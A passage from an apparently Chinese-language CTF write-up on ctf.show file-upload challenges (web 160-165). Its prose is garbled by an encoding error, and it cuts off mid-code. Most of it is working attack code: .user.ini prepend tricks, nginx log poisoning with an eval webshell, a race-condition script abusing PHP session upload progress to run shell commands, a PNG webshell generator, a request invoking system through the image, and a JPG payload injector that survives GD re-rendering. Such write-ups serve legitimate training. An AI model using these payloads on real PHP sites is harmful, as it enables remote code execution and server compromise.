æ³•è°ƒç”¨æ‰€æœ‰çš„å‡½æ•°äº†ï¼Œä½†æ˜¯èƒ½åˆ©ç”¨phpç‰¹æ€§ï¼Œå‘½ä»¤æ‰§è¡Œå¯ä»¥ç”¨&#96;&#96;ï¼ˆåå¼•å·åŒ…æ¶µï¼‰</p><blockquote><?=`nl ../fl*`?></blockquote><h4><span id="web-160">web 160</span></h4><p>ä¸ä¸Šé¢˜ç›¸æ¯”ï¼Œè¿™é¢˜å°†ç©ºæ ¼å’Œ&#96;&#96;åå¼•å·å’Œlogè¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ—¶å€™è¦æ³¨æ„ç•¥è¿‡å¤šä½™çš„ç©ºæ ¼ï¼Œlogå¯ä»¥ç”¨ç‚¹å·æ‹¼æ¥ç»•è¿‡ï¼Œä¸”æœ¬é¢˜ä¸èƒ½ä½¿ç”¨ä¸Šé¢˜çš„æ–¹æ³•ï¼Œè€ƒè™‘åˆ°æ—¥å¿—åŒ…å«ã€‚</p><p>é¦–å…ˆä¸Šä¼ <code>.user.ini</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=/var/www/html/upload/<span class="number">1</span>.png</span><br><span class="line">// æˆ–è€…</span><br><span class="line">auto_prepend_file=<span class="number">1</span>.png</span><br></pre></td></tr></table></figure><p>nginxçš„æ—¥å¿—æ–‡ä»¶åœ¨&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logé‡Œå¤´ï¼Œå…ˆçœ‹çœ‹æ—¥å¿—æ–‡ä»¶æœ‰ä»€ä¹ˆï¼Œè¿™é‡Œä¸Šä¼ å†…å®¹ä¸º</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// ç»•è¿‡æ£€æŸ¥</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure><p>UAæ”¹ä¸º</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><h4><span id="web162">web162</span></h4><p>å¤§è‡´æ€è·¯å’Œä¸Šé¢˜ç±»ä¼¼,ä¸è¿‡åœ¨ä¸Šä¼ .user.iniçš„æ—¶å€™å‘ç°<code>.</code>è¢«è¿‡æ»¤äº†,å¯ä»¥æŠŠåŒ…å«çš„æ–‡ä»¶ä¸å¸¦åç¼€æ¥ç»•è¿‡</p><p><strong>åŒ…å«æ–‡ä»¶æ³•</strong></p><ul><li>.user.ini</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="attr">auto_prepend_file</span>=png</span><br></pre></td></tr></table></figure><ul><li>png</li><li>å–åè„šæœ¬</li></ul><p><strong>åŒ…å«sessionï¼Œæ¡ä»¶ç«äº‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;abc&#x27;</span> <span class="comment">#ä¹‹å‰ä¸Šä¼ æ—¶è‡ªæ‹Ÿçš„åå­—</span></span><br><span class="line">url1 = <span class="string">&quot;http://2c61d1a6-5b2d-4d20-8367-9d9b9875e436.chall.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://2c61d1a6-5b2d-4d20-8367-9d9b9875e436.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;yu22x tql&#x27;</span>  <span class="comment">#æ–‡ä»¶åï¼Œéšä¾¿æ”¹å°±è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(): <span class="comment">#ä¸Šä¼ æ–‡ä»¶ç«äº‰è¿‡ç¨‹</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment">#æ¯æ¬¡ç«äº‰å®Œéƒ½è®¿é—®ä¸€ä¸‹url/uoloadçœ‹æœ‰æ²¡æœ‰flag</span></span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag=re.<span class="built_in">compile</span>(<span class="string">&#x27;ctfshow&#123;.+&#125;&#x27;</span>) <span class="comment">#æˆ‘åœ¨åšé¢˜çš„æ—¶å€™flagæ ¼å¼å·²ç»æ”¹æˆctfshow&#123;&#125;äº†</span></span><br><span class="line">            <span class="built_in">print</span>(flag.findall(r.text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><h4><span id="web-164">web 164</span></h4><p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">å›¾ç‰‡æœ¨é©¬</a></p><p><a href="https://www.jianshu.com/p/744001fd0738">äºŒæ¬¡æ¸²æŸ“åŸç†</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>); <span class="comment">#ä¿å­˜åœ¨æœ¬åœ°çš„å›¾ç‰‡é©¬</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?=$_GET[0]($_POST[1]);?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡bpå»è®¿é—®å›¾ç‰‡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/download.php?image=4a47a0db6e60853dedfcfdf08a5ca249.png&amp;0=system</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>113f313e-076e-4fc6-9c58-07e68e75cc22.challenge.ctf.show</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://113f313e-076e-4fc6-9c58-07e68e75cc22.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">1</span>=tac f*</span></span><br></pre></td></tr></table></figure><h4><span id="web-165">web 165</span></h4><ul><li>å¤§ç¥çš„è„šæœ¬</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;</span>; <span class="comment">//æ³¨æ„$è½¬ä¹‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> =</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                        <span class="variable">$miniPayload</span> .</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> 